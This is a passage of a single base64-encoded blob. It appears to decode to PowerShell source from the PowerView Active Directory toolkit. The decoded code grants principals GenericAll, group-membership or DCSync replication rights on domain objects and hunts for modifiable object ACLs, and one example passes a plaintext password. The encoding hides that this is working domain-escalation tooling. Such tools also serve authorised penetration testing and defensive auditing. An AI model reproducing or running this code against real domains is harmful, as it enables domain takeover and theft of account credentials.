c2OC0wMGFhMDA2ZTA1MjknIH0KICAgICAgICAgICAgICAgICAgICAjIGFsbG93cyBmb3IgdGhlIG1vZGlmaWNhdGlvbiBvZiBncm91cCBtZW1iZXJzaGlwCiAgICAgICAgICAgICAgICAgICAgJ1dyaXRlTWVtYmVycycgeyAnYmY5Njc5YzAtMGRlNi0xMWQwLWEyODUtMDBhYTAwMzA0OWUyJyB9CiAgICAgICAgICAgICAgICAgICAgIyAnRFMtUmVwbGljYXRpb24tR2V0LUNoYW5nZXMnID0gMTEzMWY2YWEtOWMwNy0xMWQxLWY3OWYtMDBjMDRmYzJkY2QyCiAgICAgICAgICAgICAgICAgICAgIyAnRFMtUmVwbGljYXRpb24tR2V0LUNoYW5nZXMtQWxsJyA9IDExMzFmNmFkLTljMDctMTFkMS1mNzlmLTAwYzA0ZmMyZGNkMgogICAgICAgICAgICAgICAgICAgICMgJ0RTLVJlcGxpY2F0aW9uLUdldC1DaGFuZ2VzLUluLUZpbHRlcmVkLVNldCcgPSA4OWU5NWI3Ni00NDRkLTRjNjItOTkxYS0wZmFjYmVkYTY0MGMKICAgICAgICAgICAgICAgICAgICAjICAgd2hlbiBhcHBsaWVkIHRvIGEgZG9tYWluJ3MgQUNMLCBhbGxvd3MgZm9yIHRoZSB1c2Ugb2YgRENTeW5jCiAgICAgICAgICAgICAgICAgICAgJ0RDU3luYycgeyAnMTEzMWY2YWEtOWMwNy0xMWQxLWY3OWYtMDBjMDRmYzJkY2QyJywgJzExMzFmNmFkLTljMDctMTFkMS1mNzlmLTAwYzA0ZmMyZGNkMicsICc4OWU5NWI3Ni00NDRkLTRjNjItOTkxYS0wZmFjYmVkYTY0MGMnfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CgogICAgICAgICAgICBGb3JFYWNoICgkUHJpbmNpcGFsT2JqZWN0IGluICRQcmluY2lwYWxzKSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbQWRkLURvbWFpbk9iamVjdEFjbF0gR3JhbnRpbmcgcHJpbmNpcGFsICQoJFByaW5jaXBhbE9iamVjdC5kaXN0aW5ndWlzaGVkbmFtZSkgJyRSaWdodHMnIG9uICQoJFRhcmdldE9iamVjdC5Qcm9wZXJ0aWVzLmRpc3Rpbmd1aXNoZWRuYW1lKSIKCiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICRJZGVudGl0eSA9IFtTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLklkZW50aXR5UmVmZXJlbmNlXSAoW1N5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuU2VjdXJpdHlJZGVudGlmaWVyXSRQcmluY2lwYWxPYmplY3Qub2JqZWN0c2lkKQoKICAgICAgICAgICAgICAgICAgICBpZiAoJEdVSURzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIEZvckVhY2ggKCRHVUlEIGluICRHVUlEcykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE5ld0dVSUQgPSBOZXctT2JqZWN0IEd1aWQgJEdVSUQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRBRFJpZ2h0cyA9IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5UmlnaHRzXSAnRXh0ZW5kZWRSaWdodCcKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRBQ0VzICs9IE5ldy1PYmplY3QgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeUFjY2Vzc1J1bGUgJElkZW50aXR5LCAkQURSaWdodHMsICRDb250cm9sVHlwZSwgJE5ld0dVSUQsICRJbmhlcml0YW5jZVR5cGUKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgIyBkZWF1bHQgdG8gR2VuZXJpY0FsbCByaWdodHMKICAgICAgICAgICAgICAgICAgICAgICAgJEFEUmlnaHRzID0gW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnlSaWdodHNdICdHZW5lcmljQWxsJwogICAgICAgICAgICAgICAgICAgICAgICAkQUNFcyArPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnlBY2Nlc3NSdWxlICRJZGVudGl0eSwgJEFEUmlnaHRzLCAkQ29udHJvbFR5cGUsICRJbmhlcml0YW5jZVR5cGUKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICMgYWRkIGFsbCB0aGUgbmV3IEFDRXMgdG8gdGhlIHNwZWNpZmllZCBvYmplY3QgZGlyZWN0b3J5IGVudHJ5CiAgICAgICAgICAgICAgICAgICAgRm9yRWFjaCAoJEFDRSBpbiAkQUNFcykgewogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbQWRkLURvbWFpbk9iamVjdEFjbF0gR3JhbnRpbmcgcHJpbmNpcGFsICQoJFByaW5jaXBhbE9iamVjdC5kaXN0aW5ndWlzaGVkbmFtZSkgcmlnaHRzIEdVSUQgJyQoJEFDRS5PYmplY3RUeXBlKScgb24gJCgkVGFyZ2V0T2JqZWN0LlByb3BlcnRpZXMuZGlzdGluZ3Vpc2hlZG5hbWUpIgogICAgICAgICAgICAgICAgICAgICAgICAkVGFyZ2V0RW50cnkgPSAkVGFyZ2V0T2JqZWN0LkdldERpcmVjdG9yeUVudHJ5KCkKICAgICAgICAgICAgICAgICAgICAgICAgJFRhcmdldEVudHJ5LlBzQmFzZS5PYmplY3RTZWN1cml0eS5BZGRBY2Nlc3NSdWxlKCRBQ0UpCiAgICAgICAgICAgICAgICAgICAgICAgICRUYXJnZXRFbnRyeS5Qc0Jhc2UuQ29tbWl0Q2hhbmdlcygpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltBZGQtRG9tYWluT2JqZWN0QWNsXSBFcnJvciBncmFudGluZyBwcmluY2lwYWwgJCgkUHJpbmNpcGFsT2JqZWN0LmRpc3Rpbmd1aXNoZWRuYW1lKSAnJFJpZ2h0cycgb24gJCgkVGFyZ2V0T2JqZWN0LlByb3BlcnRpZXMuZGlzdGluZ3Vpc2hlZG5hbWUpIDogJF8iCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0KCgpmdW5jdGlvbiBGaW5kLUludGVyZXN0aW5nRG9tYWluQWNsIHsKPCMKLlNZTk9QU0lTCgpGaW5kcyBvYmplY3QgQUNMcyBpbiB0aGUgY3VycmVudCAob3Igc3BlY2lmaWVkKSBkb21haW4gd2l0aCBtb2RpZmljYXRpb24KcmlnaHRzIHNldCB0byBub24tYnVpbHQgaW4gb2JqZWN0cy4KClRoYW5rcyBTZWFuIE1ldGNhbGYgKEBweXJvdGVrMykgZm9yIHRoZSBpZGVhIGFuZCBndWlkYW5jZS4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogR2V0LURvbWFpbk9iamVjdEFjbCwgR2V0LURvbWFpbk9iamVjdCwgQ29udmVydC1BRE5hbWUgIAoKLkRFU0NSSVBUSU9OCgpUaGlzIGZ1bmN0aW9uIGVudW1lcmF0ZXMgdGhlIEFDTHMgZm9yIGV2ZXJ5IG9iamVjdCBpbiB0aGUgZG9tYWluIHdpdGggR2V0LURvbWFpbk9iamVjdEFjbCwKYW5kIGZvciBlYWNoIHJldHVybmVkIEFDRSBlbnRyeSBpdCBjaGVja3MgaWYgcHJpbmNpcGFsIHNlY3VyaXR5IGlkZW50aWZpZXIKaXMgKi0xMDAwIChtZWFuaW5nIHRoZSBhY2NvdW50IGlzIG5vdCBidWlsdCBpbiksIGFuZCBhbHNvIGNoZWNrcyBpZiB0aGUgcmlnaHRzIGZvcgp0aGUgQUNFIG1lYW4gdGhlIG9iamVjdCBjYW4gYmUgbW9kaWZpZWQgYnkgdGhlIHByaW5jaXBhbC4gSWYgdGhlc2UgY29uZGl0aW9ucyBhcmUgbWV0LAp0aGVuIHRoZSBzZWN1cml0eSBpZGVudGlmaWVyIFNJRCBpcyB0cmFuc2xhdGVkLCB0aGUgZG9tYWluIG9iamVjdCBpcyByZXRyaWV2ZWQsIGFuZAphZGRpdGlvbmFsIElkZW50aXR5UmVmZXJlbmNlKiBpbmZvcm1hdGlvbiBpcyBhcHBlbmRlZCB0byB0aGUgb3V0cHV0IG9iamVjdC4KCi5QQVJBTUVURVIgRG9tYWluCgpTcGVjaWZpZXMgdGhlIGRvbWFpbiB0byB1c2UgZm9yIHRoZSBxdWVyeSwgZGVmYXVsdHMgdG8gdGhlIGN1cnJlbnQgZG9tYWluLgoKLlBBUkFNRVRFUiBSZXNvbHZlR1VJRHMKClN3aXRjaC4gUmVzb2x2ZSBHVUlEcyB0byB0aGVpciBkaXNwbGF5IG5hbWVzLgoKLlBBUkFNRVRFUiBMREFQRmlsdGVyCgpTcGVjaWZpZXMgYW4gTERBUCBxdWVyeSBzdHJpbmcgdGhhdCBpcyB1c2VkIHRvIGZpbHRlciBBY3RpdmUgRGlyZWN0b3J5IG9iamVjdHMuCgouUEFSQU1FVEVSIFNlYXJjaEJhc2UKClRoZSBMREFQIHNvdXJjZSB0byBzZWFyY2ggdGhyb3VnaCwgZS5nLiAiTERBUDovL09VPXNlY3JldCxEQz10ZXN0bGFiLERDPWxvY2FsIgpVc2VmdWwgZm9yIE9VIHF1ZXJpZXMuCgouUEFSQU1FVEVSIFNlcnZlcgoKU3BlY2lmaWVzIGFuIEFjdGl2ZSBEaXJlY3Rvcnkgc2VydmVyIChkb21haW4gY29udHJvbGxlcikgdG8gYmluZCB0by4KCi5QQVJBTUVURVIgU2VhcmNoU2NvcGUKClNwZWNpZmllcyB0aGUgc2NvcGUgdG8gc2VhcmNoIHVuZGVyLCBCYXNlL09uZUxldmVsL1N1YnRyZWUgKGRlZmF1bHQgb2YgU3VidHJlZSkuCgouUEFSQU1FVEVSIFJlc3VsdFBhZ2VTaXplCgpTcGVjaWZpZXMgdGhlIFBhZ2VTaXplIHRvIHNldCBmb3IgdGhlIExEQVAgc2VhcmNoZXIgb2JqZWN0LgoKLlBBUkFNRVRFUiBTZXJ2ZXJUaW1lTGltaXQKClNwZWNpZmllcyB0aGUgbWF4aW11bSBhbW91bnQgb2YgdGltZSB0aGUgc2VydmVyIHNwZW5kcyBzZWFyY2hpbmcuIERlZmF1bHQgb2YgMTIwIHNlY29uZHMuCgouUEFSQU1FVEVSIFRvbWJzdG9uZQoKU3dpdGNoLiBTcGVjaWZpZXMgdGhhdCB0aGUgc2VhcmNoZXIgc2hvdWxkIGFsc28gcmV0dXJuIGRlbGV0ZWQvdG9tYnN0b25lZCBvYmplY3RzLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW9uIHRvIHRoZSB0YXJnZXQgZG9tYWluLgoKLkVYQU1QTEUKCkZpbmQtSW50ZXJlc3RpbmdEb21haW5BY2wKCkZpbmRzIGludGVyZXN0aW5nIG9iamVjdCBBQ0xTIGluIHRoZSBjdXJyZW50IGRvbWFpbi4KCi5FWEFNUExFCgpGaW5kLUludGVyZXN0aW5nRG9tYWluQWNsIC1Eb21haW4gZGV2LnRlc3RsYWIubG9jYWwgLVJlc29sdmVHVUlEcwoKRmluZHMgaW50ZXJlc3Rpbmcgb2JqZWN0IEFDTFMgaW4gdGhlIGV2LnRlc3RsYWIubG9jYWwgZG9tYWluIGFuZApyZXNvbHZlcyByaWdodHMgR1VJRHMgdG8gZGlzcGxheSBuYW1lcy4KCi5FWEFNUExFCgokU2VjUGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICdQYXNzd29yZDEyMyEnIC1Bc1BsYWluVGV4dCAtRm9yY2UKJENyZWQgPSBOZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsKCdURVNUTEFCXGRmbS5hJywgJFNlY1Bhc3N3b3JkKQpGaW5kLUludGVyZXN0aW5nRG9tYWluQWNsIC1DcmVkZW50aWFsICRDcmVkIC1SZXNvbHZlR1VJRHMKCi5PVVRQVVRTCgpQb3dlclZpZXcuQUNMCgpDdXN0b20gUFNPYmplY3Qgd2l0aCBBQ0wgZW50cmllcy4KIz4KCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5BQ0wnKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSAoCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdEb21haW5OYW1lJywgJ05hbWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFJlc29sdmVHVUlEcywKCiAgICAgICAgW1N0cmluZ10KICAgICAgICBbVmFsaWRhdGVTZXQoJ0FsbCcsICdSZXNldFBhc3N3b3JkJywgJ1dyaXRlTWVtYmVycycpXQogICAgICAgICRSaWdodHNGaWx0ZXIsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdGaWx0ZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRMREFQRmlsdGVyLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnQURTUGF0aCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaEJhc2UsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAoKICAgICAgICBbVmFsaWRhdGVTZXQoJ0Jhc2UnLCAnT25lTGV2ZWwnLCAnU3VidHJlZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaFNjb3BlID0gJ1N1YnRyZWUnLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkUmVzdWx0UGFnZVNpemUgPSAyMDAsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRTZXJ2ZXJUaW1lTGltaXQsCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFRvbWJzdG9uZSwKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCgogICAgQkVHSU4gewogICAgICAgICRBQ0xBcmd1bWVudHMgPSBAe30KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXNvbHZlR1VJRHMnXSkgeyAkQUNMQXJndW1lbnRzWydSZXNvbHZlR1VJRHMnXSA9ICRSZXNvbHZlR1VJRHMgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1JpZ2h0c0ZpbHRlciddKSB7ICRBQ0xBcmd1bWVudHNbJ1JpZ2h0c0ZpbHRlciddID0gJFJpZ2h0c0ZpbHRlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snTERBUEZpbHRlciddKSB7ICRBQ0xBcmd1bWVudHNbJ0xEQVBGaWx0ZXInXSA9ICRMREFQRmlsdGVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hCYXNlJ10pIHsgJEFDTEFyZ3VtZW50c1snU2VhcmNoQmFzZSddID0gJFNlYXJjaEJhc2UgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRBQ0xBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoU2NvcGUnXSkgeyAkQUNMQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRBQ0xBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRBQ0xBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25lJ10pIHsgJEFDTEFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJEFDTEFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQoKICAgICAgICAkT2JqZWN0U2VhcmNoZXJBcmd1bWVudHMgPSBAewogICAgICAgICAgICAnUHJvcGVydGllcycgPSAnc2FtYWNjb3VudG5hbWUsb2JqZWN0Y2xhc3MnCiAgICAgICAgICAgICdSYXcnID0gJFRydWUKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJE9iamVjdFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJE9iamVjdFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRPYmplY3RTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJE9iamVjdFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRPYmplY3RTZWFyY2hlckFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJE9iamVjdFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CgogICAgICAgICRBRE5hbWVBcmd1bWVudHMgPSBAe30KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkQUROYW1lQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkQUROYW1lQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CgogICAgICAgICMgb25nb2luZyBsaXN0IG9mIGJ1aWx0LXVwIFNJRHMKICAgICAgICAkUmVzb2x2ZWRTSURzID0gQHt9CiAgICB9CgogICAgUFJPQ0VTUyB7CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsKICAgICAgICAgICAgJEFDTEFyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluCiAgICAgICAgICAgICRBRE5hbWVBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbgogICAgICAgIH0KCiAgICAgICAgR2V0LURvbWFpbk9iamVjdEFjbCBAQUNMQXJndW1lbnRzIHwgRm9yRWFjaC1PYmplY3QgewoKICAgICAgICAgICAgaWYgKCAoJF8uQWN0aXZlRGlyZWN0b3J5UmlnaHRzIC1tYXRjaCAnR2VuZXJpY0FsbHxXcml0ZXxDcmVhdGV8RGVsZXRlJykgLW9yICgoJF8uQWN0aXZlRGlyZWN0b3J5UmlnaHRzIC1tYXRjaCAnRXh0ZW5kZWRSaWdodCcpIC1hbmQgKCRfLkFjZVF1YWxpZmllciAtbWF0Y2ggJ0FsbG93JykpKSB7CiAgICAgICAgICAgICAgICAjIG9ubHkgcHJvY2VzcyBTSURzID4gMTAwMAogICAgICAgICAgICAgICAgaWYgKCRfLlNlY3VyaXR5SWRlbnRpZmllci5WYWx1ZSAtbWF0Y2ggJ15TLTEtNS0uKi1bMS05XVxkezMsfSQnKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKCRSZXNvbHZlZFNJRHNbJF8uU2VjdXJpdHlJZGVudGlmaWVyLlZhbHVlXSkgewogICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlSZWZlcmVuY2VOYW1lLCAkSWRlbnRpdHlSZWZlcmVuY2VEb21haW4sICRJZGVudGl0eVJlZmVyZW5jZUROLCAkSWRlbnRpdHlSZWZlcmVuY2VDbGFzcyA9ICRSZXNvbHZlZFNJRHNbJF8uU2VjdXJpdHlJZGVudGlmaWVyLlZhbHVlXQoKICAgICAgICAgICAgICAgICAgICAgICAgJEludGVyZXN0aW5nQUNMID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICAgICAkSW50ZXJlc3RpbmdBQ0wgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnT2JqZWN0RE4nICRfLk9iamVjdEROCiAgICAgICAgICAgICAgICAgICAgICAgICRJbnRlcmVzdGluZ0FDTCB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdBY2VRdWFsaWZpZXInICRfLkFjZVF1YWxpZmllcgogICAgICAgICAgICAgICAgICAgICAgICAkSW50ZXJlc3RpbmdBQ0wgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnQWN0aXZlRGlyZWN0b3J5UmlnaHRzJyAkXy5BY3RpdmVEaXJlY3RvcnlSaWdodHMKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRfLk9iamVjdEFjZVR5cGUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRJbnRlcmVzdGluZ0FDTCB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdPYmplY3RBY2VUeXBlJyAkXy5PYmplY3RBY2VUeXBlCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSW50ZXJlc3RpbmdBQ0wgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnT2JqZWN0QWNlVHlwZScgJ05vbmUnCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEludGVyZXN0aW5nQUNMIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ0FjZUZsYWdzJyAkXy5BY2VGbGFncwogICAgICAgICAgICAgICAgICAgICAgICAkSW50ZXJlc3RpbmdBQ0wgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnQWNlVHlwZScgJF8uQWNlVHlwZQogICAgICAgICAgICAgICAgICAgICAgICAkSW50ZXJlc3RpbmdBQ0wgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnSW5oZXJpdGFuY2VGbGFncycgJF8uSW5oZXJpdGFuY2VGbGFncwogICAgICAgICAgICAgICAgICAgICAgICAkSW50ZXJlc3RpbmdBQ0wgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnU2VjdXJpdHlJZGVudGlmaWVyJyAkXy5TZWN1cml0eUlkZW50aWZpZXIKICAgICAgICAgICAgICAgICAgICAgICAgJEludGVyZXN0aW5nQUNMIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ0lkZW50aXR5UmVmZXJlbmNlTmFtZScgJElkZW50aXR5UmVmZXJlbmNlTmFtZQogICAgICAgICAgICAgICAgICAgICAgICAkSW50ZXJlc3RpbmdBQ0wgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnSWRlbnRpdHlSZWZlcmVuY2VEb21haW4nICRJZGVudGl0eVJlZmVyZW5jZURvbWFpbgogICAgICAgICAgICAgICAgICAgICAgICAkSW50ZXJlc3RpbmdBQ0wgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnSWRlbnRpdHlSZWZlcmVuY2VETicgJElkZW50aXR5UmVmZXJlbmNlRE4KICAgICAgICAgICAgICAgICAgICAgICAgJEludGVyZXN0aW5nQUNMIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ0lkZW50aXR5UmVmZXJlbmNlQ2xhc3MnICRJZGVudGl0eVJlZmVyZW5jZUNsYXNzCiAgICAgICAgICAgICAgICAgICAgICAgICRJbnRlcmVzdGluZ0FDTAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5UmVmZXJlbmNlRE4gPSBDb252ZXJ0LUFETmFtZSAtSWRlbnRpdHkgJF8uU2VjdXJpdHlJZGVudGlmaWVyLlZhbHVlIC1PdXRwdXRUeXBlIEROIEBBRE5hbWVBcmd1bWVudHMKICAgICAgICAgICAgICAgICAgICAgICAgIyAiSWRlbnRpdHlSZWZlcmVuY2VETjogJElkZW50aXR5UmVmZXJlbmNlRE4iCgogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJElkZW50aXR5UmVmZXJlbmNlRE4pIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRJZGVudGl0eVJlZmVyZW5jZURvbWFpbiA9ICRJZGVudGl0eVJlZmVyZW5jZUROLlN1YlN0cmluZygkSWRlbnRpdHlSZWZlcmVuY2VETi5JbmRleE9mKCdEQz0nKSkgLXJlcGxhY2UgJ0RDPScsJycgLXJlcGxhY2UgJywnLCcuJwogICAgICAgICAgICAgICAgICAgICAgICAgICAgIyAiSWRlbnRpdHlSZWZlcmVuY2VEb21haW46ICRJZGVudGl0eVJlZmVyZW5jZURvbWFpbiIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRPYmplY3RTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkSWRlbnRpdHlSZWZlcmVuY2VEb21haW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRPYmplY3RTZWFyY2hlckFyZ3VtZW50c1snSWRlbnRpdHknXSA9ICRJZGVudGl0eVJlZmVyZW5jZUROCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAjICJJZGVudGl0eVJlZmVyZW5jZUROOiAkSWRlbnRpdHlSZWZlcmVuY2VETiIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRPYmplY3QgPSBHZXQtRG9tYWluT2JqZWN0IEBPYmplY3RTZWFyY2hlckFyZ3VtZW50cwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkT2JqZWN0KSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5UmVmZXJlbmNlTmFtZSA9ICRPYmplY3QuUHJvcGVydGllcy5zYW1hY2NvdW50bmFtZVswXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkT2JqZWN0LlByb3BlcnRpZXMub2JqZWN0Y2xhc3MgLW1hdGNoICdjb21wdXRlcicpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5UmVmZXJlbmNlQ2xhc3MgPSAnY29tcHV0ZXInCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2VpZiAoJE9iamVjdC5Qcm9wZXJ0aWVzLm9iamVjdGNsYXNzIC1tYXRjaCAnZ3JvdXAnKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRJZGVudGl